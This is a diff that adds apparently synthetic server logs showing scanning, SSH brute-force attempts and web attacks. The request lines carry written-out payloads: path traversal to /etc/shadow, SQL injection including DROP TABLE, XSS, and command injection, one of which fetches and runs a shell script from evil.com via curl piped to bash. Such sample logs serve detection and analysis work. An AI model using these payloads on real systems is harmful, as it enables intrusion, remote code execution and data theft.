@@ -1,0 +1,147 @@
+2026-05-24 19:31:45 INFO  session opened for user sysadmin by (uid=0)
+2026-05-24 19:31:50 INFO  127.0.0.1 - - "GET /health HTTP/1.1" 200 24
+2026-05-24 19:31:50 INFO  127.0.0.1 - - "GET /health HTTP/1.1" 200 24
+2026-05-24 19:31:50 INFO  apache2: Received SIGHUP; re-reading configuration.
+2026-05-24 19:31:51 INFO  session opened for user devops by (uid=0)
+2026-05-24 19:31:51 WARN  fail2ban: 203.0.113.99 - - "User-Agent: masscan/1.0 scanning" 400 0
+2026-05-24 19:31:51 INFO  Connection closed by authenticating user sysadmin 185.220.101.47 port 62709 [preauth]
+2026-05-24 19:31:56 INFO  127.0.0.1 - - "GET /health HTTP/1.1" 200 24
+2026-05-24 19:31:56 INFO  New session 42 of user sysadmin.
+2026-05-24 19:31:57 INFO  sshd: Received SIGHUP; re-reading configuration.
+2026-05-24 19:31:57 WARN  apache2: 10.0.0.200 - - "GET /download?file=../../../../etc/passwd HTTP/1.1" 403 152
+2026-05-24 19:31:57 INFO  Connection closed by authenticating user bob 10.0.0.200 port 51106 [preauth]
+2026-05-24 19:31:57 WARN  apache2: 10.0.0.200 - - "GET /products?cat=1 UNION ALL SELECT null,null,table_name FROM information_schema.tables-- HTTP/1.1" 500 312
+2026-05-24 19:32:03 INFO  New session 42 of user alice.
+2026-05-24 19:32:03 INFO  session opened for user ci-runner by (uid=0)
+2026-05-24 19:32:04 INFO  Connection closed by authenticating user ci-runner 10.0.0.200 port 56432 [preauth]
+2026-05-24 19:32:04 INFO  sshd: Accepted publickey for devops from 10.0.0.200 port 63621 ssh2
+2026-05-24 19:32:04 DEBUG kernel: EXT4-fs (sda1): mounted filesystem with ordered data mode.
+2026-05-24 19:32:05 INFO  session opened for user ci-runner by (uid=0)
+2026-05-24 19:32:05 WARN  fail2ban: 91.108.4.44 - - "User-Agent: Nmap/1.0 scanning" 400 0
+2026-05-24 19:32:05 INFO  New session 42 of user charlie.
+2026-05-24 19:32:05 INFO  sshd: Received SIGHUP; re-reading configuration.
+2026-05-24 19:32:06 INFO  session opened for user bob by (uid=0)
+2026-05-24 19:32:11 INFO  Connection closed by authenticating user charlie 104.21.14.55 port 52117 [preauth]
+2026-05-24 19:32:11 INFO  sshd: Received SIGHUP; re-reading configuration.
+2026-05-24 19:32:11 INFO  New session 42 of user devops.
+2026-05-24 19:32:12 INFO  session opened for user sysadmin by (uid=0)
+2026-05-24 19:32:12 INFO  session opened for user charlie by (uid=0)
+2026-05-24 19:32:12 INFO  session opened for user charlie by (uid=0)
+2026-05-24 19:32:12 WARN  apache2: 10.0.0.200 - - "GET /view?page=../../etc/shadow HTTP/1.1" 403 152
+2026-05-24 19:32:12 INFO  sshd: Accepted publickey for bob from 91.108.4.44 port 51362 ssh2
+2026-05-24 19:32:13 INFO  New session 42 of user devops.
+2026-05-24 19:32:13 INFO  session opened for user charlie by (uid=0)
+2026-05-24 19:32:18 INFO  New session 42 of user charlie.
+2026-05-24 19:32:18 INFO  New session 42 of user ci-runner.
+2026-05-24 19:32:18 INFO  New session 42 of user alice.
+2026-05-24 19:32:19 INFO  Connection closed by authenticating user devops 203.0.113.99 port 57918 [preauth]
+2026-05-24 19:32:19 WARN  apache2: 45.33.32.156 - - "GET /read?path=../../boot.ini HTTP/1.1" 403 152
+2026-05-24 19:32:19 INFO  Connection closed by authenticating user bob 1.179.160.21 port 58968 [preauth]
+2026-05-24 19:32:19 INFO  Connection closed by authenticating user ci-runner 91.108.4.44 port 52784 [preauth]
+2026-05-24 19:32:20 WARN  apache2: 45.33.32.156 - - "GET /view?page=../../etc/shadow HTTP/1.1" 403 152
+2026-05-24 19:32:26 DEBUG kernel: EXT4-fs (sda1): mounted filesystem with ordered data mode.
+2026-05-24 19:32:26 INFO  session opened for user devops by (uid=0)
+2026-05-24 19:32:26 WARN  nginx: 51.254.25.115 - - "POST /comment?content=<script>alert("xss")</script> HTTP/1.1" 200 88
+2026-05-24 19:32:26 INFO  session opened for user devops by (uid=0)
+2026-05-24 19:32:27 INFO  postfix: Received SIGHUP; re-reading configuration.
+2026-05-24 19:32:27 INFO  apache2: Received SIGHUP; re-reading configuration.
+2026-05-24 19:32:27 WARN  sshd[3717]: Failed password for invalid user mysql from 10.0.0.200 port 49177 ssh2
+2026-05-24 19:32:27 WARN  sshd[3771]: Failed password for invalid user mysql from 10.0.0.200 port 60852 ssh2
+2026-05-24 19:32:28 WARN  sshd[2136]: Failed password for invalid user pi from 10.0.0.200 port 61264 ssh2
+2026-05-24 19:32:28 WARN  sshd[5417]: Failed password for invalid user ftp from 10.0.0.200 port 55912 ssh2
+2026-05-24 19:32:28 WARN  sshd[2823]: Failed password for invalid user mysql from 10.0.0.200 port 51985 ssh2
+2026-05-24 19:32:28 WARN  sshd[6716]: Failed password for invalid user user from 10.0.0.200 port 51314 ssh2
+2026-05-24 19:32:28 WARN  sshd[2733]: Failed password for ubuntu from 10.0.0.200 port 55479 ssh2
+2026-05-24 19:32:28 WARN  sshd[1888]: Failed password for invalid user pi from 10.0.0.200 port 58324 ssh2
+2026-05-24 19:32:28 WARN  sshd[2952]: Failed password for invalid user mysql from 10.0.0.200 port 60678 ssh2
+2026-05-24 19:32:28 WARN  sshd[6650]: Failed password for invalid user user from 10.0.0.200 port 61443 ssh2
+2026-05-24 19:32:28 WARN  sshd[4537]: Failed password for user from 10.0.0.200 port 59286 ssh2
+2026-05-24 19:32:29 WARN  sshd[7631]: Failed password for invalid user admin from 10.0.0.200 port 61873 ssh2
+2026-05-24 19:32:33 INFO  sshd: Accepted publickey for ci-runner from 172.16.31.99 port 61552 ssh2
+2026-05-24 19:32:33 INFO  127.0.0.1 - - "GET /health HTTP/1.1" 200 24
+2026-05-24 19:32:33 INFO  session opened for user alice by (uid=0)
+2026-05-24 19:32:34 INFO  New session 42 of user devops.
+2026-05-24 19:32:34 WARN  sshd[9990]: Failed password for invalid user ftp from 104.21.14.55 port 58373 ssh2
+2026-05-24 19:32:34 WARN  sshd[7095]: Failed password for invalid user test from 104.21.14.55 port 51342 ssh2
+2026-05-24 19:32:34 WARN  sshd[7082]: Failed password for test from 104.21.14.55 port 62805 ssh2
+2026-05-24 19:32:34 WARN  sshd[8499]: Failed password for invalid user ubuntu from 104.21.14.55 port 61564 ssh2
+2026-05-24 19:32:34 WARN  sshd[7197]: Failed password for mysql from 104.21.14.55 port 50226 ssh2
+2026-05-24 19:32:35 WARN  sshd[7611]: Failed password for ftp from 104.21.14.55 port 61618 ssh2
+2026-05-24 19:32:35 WARN  sshd[5434]: Failed password for invalid user test from 104.21.14.55 port 59679 ssh2
+2026-05-24 19:32:35 WARN  sshd[3724]: Failed password for invalid user ubuntu from 104.21.14.55 port 56397 ssh2
+2026-05-24 19:32:35 WARN  sshd[1066]: Failed password for invalid user ftp from 104.21.14.55 port 49090 ssh2
+2026-05-24 19:32:35 WARN  sshd[1591]: Failed password for invalid user mysql from 104.21.14.55 port 62740 ssh2
+2026-05-24 19:32:35 WARN  sshd[2214]: Failed password for invalid user user from 104.21.14.55 port 63861 ssh2
+2026-05-24 19:32:35 WARN  sshd[3357]: Failed password for ubuntu from 104.21.14.55 port 61421 ssh2
+2026-05-24 19:32:35 INFO  New session 42 of user charlie.
+2026-05-24 19:32:36 INFO  127.0.0.1 - - "GET /health HTTP/1.1" 200 24
+2026-05-24 19:32:36 CRIT  nginx: 1.179.160.21 - - "GET /exec?cmd=|ls+-la+/etc HTTP/1.1" 200 256
+2026-05-24 19:32:42 DEBUG kernel: EXT4-fs (sda1): mounted filesystem with ordered data mode.
+2026-05-24 19:32:42 INFO  sshd: Accepted publickey for sysadmin from 198.51.100.22 port 63652 ssh2
+2026-05-24 19:32:42 WARN  apache2: 185.220.101.47 - - "GET /search?q=1' OR '1'='1 HTTP/1.1" 500 312
+2026-05-24 19:32:42 INFO  127.0.0.1 - - "GET /health HTTP/1.1" 200 24
+2026-05-24 19:32:43 INFO  127.0.0.1 - - "GET /health HTTP/1.1" 200 24
+2026-05-24 19:32:49 INFO  Connection closed by authenticating user ci-runner 91.108.4.44 port 58744 [preauth]
+2026-05-24 19:32:50 INFO  Connection closed by authenticating user alice 203.0.113.99 port 50756 [preauth]
+2026-05-24 19:32:50 DEBUG kernel: EXT4-fs (sda1): mounted filesystem with ordered data mode.
+2026-05-24 19:32:50 INFO  sshd: Accepted publickey for bob from 104.21.14.55 port 53806 ssh2
+2026-05-24 19:32:50 WARN  sshd[4900]: Failed password for admin from 91.108.4.44 port 62226 ssh2
+2026-05-24 19:32:50 WARN  sshd[6723]: Failed password for pi from 91.108.4.44 port 56600 ssh2
+2026-05-24 19:32:51 WARN  sshd[3088]: Failed password for invalid user test from 91.108.4.44 port 50362 ssh2
+2026-05-24 19:32:51 WARN  sshd[8216]: Failed password for test from 91.108.4.44 port 55541 ssh2
+2026-05-24 19:32:51 WARN  sshd[5065]: Failed password for invalid user pi from 91.108.4.44 port 62337 ssh2
+2026-05-24 19:32:51 WARN  sshd[8588]: Failed password for invalid user root from 91.108.4.44 port 54773 ssh2
+2026-05-24 19:32:51 WARN  sshd[2122]: Failed password for admin from 91.108.4.44 port 57496 ssh2
+2026-05-24 19:32:51 WARN  sshd[9348]: Failed password for invalid user ftp from 91.108.4.44 port 49047 ssh2
+2026-05-24 19:32:51 WARN  sshd[2310]: Failed password for mysql from 91.108.4.44 port 56359 ssh2
+2026-05-24 19:32:51 WARN  sshd[9808]: Failed password for invalid user admin from 91.108.4.44 port 60913 ssh2
+2026-05-24 19:32:52 WARN  sshd[4423]: Failed password for ubuntu from 91.108.4.44 port 56308 ssh2
+2026-05-24 19:32:52 WARN  sshd[3112]: Failed password for invalid user pi from 91.108.4.44 port 58089 ssh2
+2026-05-24 19:32:52 INFO  New session 42 of user charlie.
+2026-05-24 19:32:52 INFO  Connection closed by authenticating user devops 45.33.32.156 port 53515 [preauth]
+2026-05-24 19:32:58 INFO  sshd: Accepted publickey for alice from 51.254.25.115 port 64804 ssh2
+2026-05-24 19:32:58 INFO  sshd: Received SIGHUP; re-reading configuration.
+2026-05-24 19:32:59 INFO  New session 42 of user charlie.
+2026-05-24 19:32:59 WARN  nginx: 104.21.14.55 - - "POST /comment?content=<iframe src=javascript:alert("XSS")></iframe> HTTP/1.1" 200 88
+2026-05-24 19:32:59 DEBUG kernel: EXT4-fs (sda1): mounted filesystem with ordered data mode.
+2026-05-24 19:32:59 INFO  Connection closed by authenticating user devops 1.179.160.21 port 52182 [preauth]
+2026-05-24 19:33:05 INFO  New session 42 of user sysadmin.
+2026-05-24 19:33:05 DEBUG kernel: EXT4-fs (sda1): mounted filesystem with ordered data mode.
+2026-05-24 19:33:05 WARN  nginx: 203.0.113.99 - - "POST /comment?content=javascript:alert(1) HTTP/1.1" 200 88
+2026-05-24 19:33:05 INFO  sshd: Accepted publickey for charlie from 203.0.113.99 port 57210 ssh2
+2026-05-24 19:33:05 INFO  New session 42 of user charlie.
+2026-05-24 19:33:06 CRIT  nginx: 51.254.25.115 - - "GET /run?input=$(curl+http://evil.com/shell.sh|bash) HTTP/1.1" 200 256
+2026-05-24 19:33:10 INFO  New session 42 of user alice.
+2026-05-24 19:33:10 INFO  session opened for user charlie by (uid=0)
+2026-05-24 19:33:11 INFO  New session 42 of user sysadmin.
+2026-05-24 19:33:11 INFO  Connection closed by authenticating user devops 203.0.113.99 port 59153 [preauth]
+2026-05-24 19:33:11 WARN  sshd[2467]: Failed password for invalid user ubuntu from 185.220.101.47 port 51501 ssh2
+2026-05-24 19:33:11 WARN  sshd[7684]: Failed password for mysql from 185.220.101.47 port 58236 ssh2
+2026-05-24 19:33:11 WARN  sshd[6332]: Failed password for invalid user admin from 185.220.101.47 port 53882 ssh2
+2026-05-24 19:33:11 WARN  sshd[9449]: Failed password for pi from 185.220.101.47 port 60109 ssh2
+2026-05-24 19:33:12 WARN  sshd[3133]: Failed password for invalid user test from 185.220.101.47 port 50554 ssh2
+2026-05-24 19:33:12 WARN  sshd[9409]: Failed password for invalid user test from 185.220.101.47 port 49347 ssh2
+2026-05-24 19:33:12 WARN  sshd[8177]: Failed password for root from 185.220.101.47 port 55930 ssh2
+2026-05-24 19:33:12 WARN  sshd[5844]: Failed password for invalid user ubuntu from 185.220.101.47 port 55865 ssh2
+2026-05-24 19:33:12 WARN  sshd[1719]: Failed password for invalid user test from 185.220.101.47 port 54499 ssh2
+2026-05-24 19:33:12 WARN  sshd[6838]: Failed password for invalid user test from 185.220.101.47 port 58486 ssh2
+2026-05-24 19:33:12 WARN  sshd[7697]: Failed password for invalid user mysql from 185.220.101.47 port 58071 ssh2
+2026-05-24 19:33:12 WARN  sshd[4264]: Failed password for invalid user pi from 185.220.101.47 port 57927 ssh2
+2026-05-24 19:33:13 INFO  nginx: Received SIGHUP; re-reading configuration.
+2026-05-24 19:33:17 INFO  Connection closed by authenticating user charlie 10.0.0.200 port 56889 [preauth]
+2026-05-24 19:33:17 INFO  session opened for user devops by (uid=0)
+2026-05-24 19:33:18 INFO  nginx: Received SIGHUP; re-reading configuration.
+2026-05-24 19:33:18 WARN  apache2: 1.179.160.21 - - "GET /items?id=1;DROP TABLE users;-- HTTP/1.1" 500 312
+2026-05-24 19:33:18 INFO  Connection closed by authenticating user bob 91.108.4.44 port 58517 [preauth]
+2026-05-24 19:33:23 INFO  Connection closed by authenticating user sysadmin 45.33.32.156 port 62373 [preauth]
+2026-05-24 19:33:23 INFO  sshd: Accepted publickey for bob from 91.108.4.44 port 51576 ssh2
+2026-05-24 19:33:23 INFO  postfix: Received SIGHUP; re-reading configuration.
+2026-05-24 19:33:23 INFO  postfix: Received SIGHUP; re-reading configuration.
+2026-05-24 19:33:24 DEBUG kernel: EXT4-fs (sda1): mounted filesystem with ordered data mode.
+2026-05-24 19:33:24 WARN  apache2: 10.0.0.200 - - "POST /api/data body=SELECT * FROM information_schema.tables HTTP/1.1" 500 312
+2026-05-24 19:33:24 INFO  sshd: Accepted publickey for devops from 51.254.25.115 port 56320 ssh2
+2026-05-24 19:33:28 INFO  session opened for user devops by (uid=0)
+2026-05-24 19:33:28 INFO  127.0.0.1 - - "GET /health HTTP/1.1" 200 24
+2026-05-24 19:33:29 WARN  nginx: 203.0.113.99 - - "POST /comment?content=<iframe src=javascript:alert("XSS")></iframe> HTTP/1.1" 200 88
+2026-05-24 19:33:29 INFO  session opened for user devops by (uid=0)
+2026-05-24 19:33:29 INFO  mysql: Received SIGHUP; re-reading configuration.
